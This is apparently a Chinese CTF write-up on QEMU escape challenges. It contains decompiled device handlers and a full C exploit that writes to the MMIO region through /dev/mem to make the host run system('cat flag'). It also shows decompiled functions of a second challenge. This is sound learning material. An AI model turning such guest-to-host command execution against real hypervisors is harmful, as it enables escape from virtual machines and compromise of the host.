<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop/qemu$ ps -aux | grep qemu</span><br><span class="line">or4nge     977  4.3  0.8 375628 138068 pts/0   Sl+  14:43   0:10 ./qemu-system-x86_64 -initrd ./initramfs.cpio -kernel ./vmlinuz-4.8.0-52-generic -append console=ttyS0 root=/dev/ram oops=panic panic=1 -monitor /dev/null -m 64M --nographic -L pc-bios -device rfid,id=vda</span><br><span class="line">or4nge    1020  0.0  0.0   4024  2020 pts/1    S+   14:47   0:00 grep --color=auto qemu</span><br><span class="line">or4nge@圈圈:/mnt/d/desktop/qemu$ gdb qemu-system-x86_64</span><br><span class="line">GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">attach pwndbg: loaded 154 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)</span><br><span class="line">Reading symbols from qemu-system-x86_64...</span><br><span class="line">(No debugging symbols found in qemu-system-x86_64)</span><br><span class="line">------- tip of the day (disable with set show-tips off) -------</span><br><span class="line">Use patch &lt;address&gt; &#x27;&lt;assembly&gt;&#x27; to patch an address with given assembly code</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">attach 977</span></span><br><span class="line">Attaching to program: /mnt/d/desktop/qemu/qemu-system-x86_64, process 977</span><br><span class="line">[New LWP 978]</span><br><span class="line">[New LWP 979]</span><br><span class="line">[New LWP 980]</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">0x00007fda04c8bcce in __ppoll (fds=0x5617d5f1f240, nfds=5, timeout=&lt;optimized out&gt;, sigmask=0x0) at ../sysdeps/unix/sysv/linux/ppoll.c:42</span><br><span class="line">42      ../sysdeps/unix/sysv/linux/ppoll.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────</span><br><span class="line">*RAX  0xfffffffffffffdfe</span><br><span class="line">*RBX  0x5617d522b7d0 —▸ 0x5617d50688c0 —▸ 0x5617d5012350 —▸ 0x5617d50124d0 ◂— &#x27;fw_cfg_io&#x27;</span><br><span class="line">*RCX  0x7fda04c8bcce (ppoll+174) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line">*RDX  0x7fff06549b90 ◂— 0x0</span><br><span class="line">*RDI  0x5617d5f1f240 ◂— 0x100000000</span><br><span class="line">*RSI  0x5</span><br><span class="line">*R8   0x8</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x0</span><br><span class="line">*R11  0x293</span><br><span class="line">*R12  0x7fff06549fd8 —▸ 0x7fff0654a285 ◂— &#x27;./qemu-system-x86_64&#x27;</span><br><span class="line">*R13  0x7fff06549b90 ◂— 0x0</span><br><span class="line">*R14  0x0</span><br><span class="line">*R15  0x7fda050f9040 (_rtld_global) —▸ 0x7fda050fa2e0 —▸ 0x5617d3600000 ◂— jg 0x5617d3600047</span><br><span class="line">*RBP  0x7fff06549c10 —▸ 0x7fff06549c40 —▸ 0x7fff06549c90 —▸ 0x7fff06549ca0 —▸ 0x7fff06549ec0 ◂— ...</span><br><span class="line">*RSP  0x7fff06549b70 ◂— 0x0</span><br><span class="line">*RIP  0x7fda04c8bcce (ppoll+174) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line">──────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────</span><br><span class="line"> ► 0x7fda04c8bcce &lt;ppoll+174&gt;    cmp    rax, -0x1000</span><br><span class="line">   0x7fda04c8bcd4 &lt;ppoll+180&gt;    ja     ppoll+240                &lt;ppoll+240&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7fda04c8bd10 &lt;ppoll+240&gt;    mov    rdx, qword ptr [rip + 0x1010f9]</span><br><span class="line">   0x7fda04c8bd17 &lt;ppoll+247&gt;    neg    eax</span><br><span class="line">   0x7fda04c8bd19 &lt;ppoll+249&gt;    mov    dword ptr fs:[rdx], eax</span><br><span class="line">   0x7fda04c8bd1c &lt;ppoll+252&gt;    mov    eax, 0xffffffff</span><br><span class="line">   0x7fda04c8bd21 &lt;ppoll+257&gt;    jmp    ppoll+182                &lt;ppoll+182&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7fda04c8bcd6 &lt;ppoll+182&gt;    mov    edi, r9d</span><br><span class="line">   0x7fda04c8bcd9 &lt;ppoll+185&gt;    mov    dword ptr [rsp + 8], eax</span><br><span class="line">   0x7fda04c8bcdd &lt;ppoll+189&gt;    call   __pthread_disable_asynccancel</span><br><span class="line">    &lt;__pthread_disable_asynccancel&gt;</span><br><span class="line"></span><br><span class="line">   0x7fda04c8bce2 &lt;ppoll+194&gt;    mov    eax, dword ptr [rsp + 8]</span><br><span class="line">────────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp     0x7fff06549b70 ◂— 0x0</span><br><span class="line">01:0008│-098     0x7fff06549b78 —▸ 0x5617d5f1f240 ◂— 0x100000000</span><br><span class="line">02:0010│-090     0x7fff06549b80 ◂— 0x5</span><br><span class="line">03:0018│-088     0x7fff06549b88 ◂— 0x0</span><br><span class="line">04:0020│ rdx r13 0x7fff06549b90 ◂— 0x0</span><br><span class="line">05:0028│-078     0x7fff06549b98 ◂— 0x2456cfa</span><br><span class="line">06:0030│-070     0x7fff06549ba0 —▸ 0x7fff06549c10 —▸ 0x7fff06549c40 —▸ 0x7fff06549c90 —▸ 0x7fff06549ca0 ◂— ...</span><br><span class="line">07:0038│-068     0x7fff06549ba8 ◂— 0x1eec99408d27f400</span><br><span class="line">──────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0   0x7fda04c8bcce ppoll+174</span><br><span class="line">   1   0x5617d3e3e1bc</span><br><span class="line">   2   0x5617d3e3f1f3</span><br><span class="line">   3   0x5617d3e3f316</span><br><span class="line">   4   0x5617d3a7b4d8</span><br><span class="line">   5   0x5617d3a82a83</span><br><span class="line">   6   0x7fda04b9cd90 __libc_start_call_main+128</span><br><span class="line">   7   0x7fda04b9ce40 __libc_start_main+128</span><br><span class="line">──────────────────────────────[ THREADS (4 TOTAL) ]──────────────────────────────</span><br><span class="line">  ► 1   &quot;qemu-system-x86&quot; stopped: 0x7fda04c8bcce &lt;ppoll+174&gt;</span><br><span class="line">    2   &quot;qemu-system-x86&quot; stopped: 0x7fda04c9188d &lt;syscall+29&gt;</span><br><span class="line">    3   &quot;qemu-system-x86&quot; stopped: 0x7fda04c04117 &lt;__futex_abstimed_wait_cancelable64+231&gt;</span><br><span class="line">    4   &quot;qemu-system-x86&quot; stopped: 0x7fda04c04117 &lt;__futex_abstimed_wait_cancelable64+231&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="数字经济众测-2019-qemu"><a href="#数字经济众测-2019-qemu" class="headerlink" title="[数字经济众测 2019] qemu"></a>[数字经济众测 2019] qemu</h2><p>由于附件没有给出符号表，于是手动对部分比较重要的函数进行了恢复</p>
<h3 id="恢复代码"><a href="#恢复代码" class="headerlink" title="恢复代码"></a>恢复代码</h3><h4 id="rfid-class-init"><a href="#rfid-class-init" class="headerlink" title="rfid_class_init"></a>rfid_class_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rfid_class_init</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = sub_70031D(a1, <span class="string">&quot;pci-device&quot;</span>, <span class="string">&quot;/home/wang/qemu/hw/misc/myrfid.c&quot;</span>, <span class="number">369LL</span>, <span class="string">&quot;rfid_class_init&quot;</span>);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = sub_571043;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">1056</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">4919</span>;</span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">105</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="rfid-mmio-write"><a href="#rfid-mmio-write" class="headerlink" title="rfid_mmio_write"></a>rfid_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">rfid_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = opaque;</span><br><span class="line">  v6 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = val;</span><br><span class="line">  v11 = opaque;</span><br><span class="line">  v8 = (addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  v9 = (addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  result = (_BYTE *)((addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int64)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">119</span>;                   <span class="comment">// w</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">115</span>;                   <span class="comment">// s</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">97</span>;                    <span class="comment">// a</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">100</span>;                   <span class="comment">// d</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">65</span>;                    <span class="comment">// A</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5uLL</span>:</span><br><span class="line">      result = byte_122FFE0;</span><br><span class="line">      byte_122FFE0[v9] = <span class="number">66</span>;                    <span class="comment">// B</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6uLL</span>:</span><br><span class="line">      v10 = (<span class="type">unsigned</span> __int16)v6;</span><br><span class="line">      result = <span class="built_in">memcpy</span>(&amp;command[(<span class="type">unsigned</span> __int16)v6], &amp;n[<span class="number">1</span>], size);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="vnln"><a href="#vnln" class="headerlink" title="vnln"></a>vnln</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vuln</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ((a2 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>) != <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(off_10CC100);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;byte_122FFE0, off_10CC100, v2) )<span class="comment">// off_10cc100 = aWwssadadbaba</span></span><br><span class="line">      system(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">270438LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以看出作者连<code>system</code>都给出来了，真的是为了出题而出题。我看主要看<code>vuln</code>函数，只要另其满足<code>2</code>个字符串相同，即可执行<code>system(commond)</code>，于是我们可以利用<code>rfid_mmio_write</code>函数来使其满足条件，最后执行<code>system(&quot;cat flag&quot;)</code>来完成逃逸</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> value)</span>&#123;</span><br><span class="line">      *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfb000000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x000000</span>,<span class="number">0</span>);  <span class="comment">//w  </span></span><br><span class="line">    mmio_write(<span class="number">0x010000</span>,<span class="number">0</span>);  <span class="comment">//w  </span></span><br><span class="line">    mmio_write(<span class="number">0x120000</span>,<span class="number">0</span>);  <span class="comment">//s   </span></span><br><span class="line">    mmio_write(<span class="number">0x130000</span>,<span class="number">0</span>);  <span class="comment">//s </span></span><br><span class="line">    mmio_write(<span class="number">0x240000</span>,<span class="number">0</span>);  <span class="comment">//a  </span></span><br><span class="line">    mmio_write(<span class="number">0x350000</span>,<span class="number">0</span>);  <span class="comment">//d </span></span><br><span class="line">    mmio_write(<span class="number">0x260000</span>,<span class="number">0</span>);  <span class="comment">//a </span></span><br><span class="line">    mmio_write(<span class="number">0x370000</span>,<span class="number">0</span>);  <span class="comment">//d  </span></span><br><span class="line">    mmio_write(<span class="number">0x580000</span>,<span class="number">0</span>);  <span class="comment">//B  </span></span><br><span class="line">    mmio_write(<span class="number">0x490000</span>,<span class="number">0</span>);  <span class="comment">//A  </span></span><br><span class="line">    mmio_write(<span class="number">0x5a0000</span>,<span class="number">0</span>);  <span class="comment">//B </span></span><br><span class="line">    mmio_write(<span class="number">0x4b0000</span>,<span class="number">0</span>);  <span class="comment">//A </span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cmd[<span class="number">0x20</span>] = <span class="string">&quot;cat flag&quot;</span>;</span><br><span class="line">    mmio_write(<span class="number">0x600000</span>,*(<span class="type">uint64_t</span> *)(&amp;cmd[<span class="number">0</span>]));</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)mmio_mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="湖湘杯-2019-pwn2"><a href="#湖湘杯-2019-pwn2" class="headerlink" title="[湖湘杯 2019] pwn2"></a>[湖湘杯 2019] pwn2</h2><h3 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h3><h4 id="strng-mmio-read"><a href="#strng-mmio-read" class="headerlink" title="strng_mmio_read"></a>strng_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __cdecl <span class="title function_">strng_mmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="strng-mmio-write"><a href="#strng-mmio-write" class="headerlink" title="strng_mmio_write"></a>strng_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">strng_mmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  seed = val;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">        opaque-&gt;regs[<span class="number">3</span>] = rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">      opaque-&gt;flag = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;regs[v5] = seed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      srand(val);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="strng-pmio-read"><a href="#strng-pmio-read" class="headerlink" title="strng_pmio_read"></a>strng_pmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __cdecl <span class="title function_">strng_pmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> v4; <span class="comment">// [rsp+14h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !addr )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;addr;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (opaque-&gt;addr &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;regs[opaque-&gt;addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
